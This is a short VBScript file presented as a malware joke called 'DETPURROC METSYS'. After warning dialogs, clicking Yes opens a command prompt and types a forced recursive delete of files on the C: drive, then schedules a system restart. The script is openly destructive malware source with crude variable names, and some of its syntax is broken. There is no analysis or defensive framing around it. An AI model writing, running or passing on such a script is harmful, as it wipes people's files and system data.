Dim SYSTEM
SYSTEM=Msgbox("You'd run a software called DETPURROC METSYS that's a malware, if you doesn't know what it is just close this and restart your system. Warning: Executing will corrupt your system and personal files. Am I not responsible for any damages."),4+16, ("DETPURROC METSYS by AlexVirusCiberneticos or CyberAlexMalw")


Select Case SYSTEM

Case vbYes

Msgbox ("are ya really sure u want to run this malware this the last warnin"),0+48,("LAST WARNING")

End SYSTEM

Dim Fuck

Set Fuck = Wscript.CreateObject("Wscript.Shell")

Return = Fuck.run ("cmd.exe",2,false)
Wscript.sleep 1000

Fuck.SendKeys "del C: /q /f /s"
Fuck.SendKeys "{ENTER}"
Fuck.SendKeys "{END}

End Fuck

Dim ASSHOLE

Set ASSHOLE = Wscript.CreateObject("Wscript.Shell")



ASSHOLE.run ("shutdown -r -t 10,1,true")


End Case


Case vbNo

Msgbox("You're safe.")
